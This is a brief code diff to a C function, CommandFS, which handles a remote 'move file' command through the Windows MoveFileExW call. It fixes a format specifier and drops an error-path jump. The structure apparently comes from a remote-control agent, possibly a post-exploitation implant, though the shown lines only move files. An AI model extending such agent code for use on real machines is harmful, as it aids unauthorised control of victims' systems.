@@ -1039,12 +1039,11 @@ VOID CommandFS( PPARSER Parser )
             PathFrom = ParserGetWString( Parser, &FromSize );
             PathTo   = ParserGetWString( Parser, &ToSize );
 
-            PRINTF( "Move file %s to %s\n", PathFrom, PathTo )
+            PRINTF( "Move file %ls to %ls\n", PathFrom, PathTo )
 
             Success = Instance.Win32.MoveFileExW( PathFrom, PathTo, MOVEFILE_REPLACE_EXISTING );
             if ( ! Success ) {
                 PACKAGE_ERROR_WIN32
-                goto CLEAR_LEAVE;
             }
 
             PackageAddInt32( Package, Success );
